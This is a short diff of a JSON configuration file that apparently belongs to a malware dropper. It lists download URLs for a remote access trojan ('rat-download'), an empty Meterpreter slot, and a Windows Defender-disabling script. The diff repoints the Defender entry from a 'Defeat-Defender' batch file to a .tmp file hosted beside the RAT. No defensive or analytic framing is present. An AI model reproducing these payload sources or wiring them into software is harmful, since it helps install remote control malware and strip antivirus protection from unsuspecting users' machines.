@@ -4,7 +4,7 @@
   "php-download": "https://windows.php.net/downloads/releases/php-7.4.30-Win32-vc15-x86.zip",
   "rat-download": "https://raw.githubusercontent.com/delypeter/http-delypeter.hu/main/main.py",
   "meterpreter-download": "",
-  "defender-download": "https://github.com/swagkarna/Defeat-Defender-V1.2.0/blob/7a6daf90b9dcbbb2929da5ba4469291d742c3cfe/Defeat-Defender.bat",
+  "defender-download": "https://raw.githubusercontent.com/delypeter/http-delypeter.hu/main/Defeat-defender.tmp",
   "csgo-download": "",
   "csgo-path": ""
 }
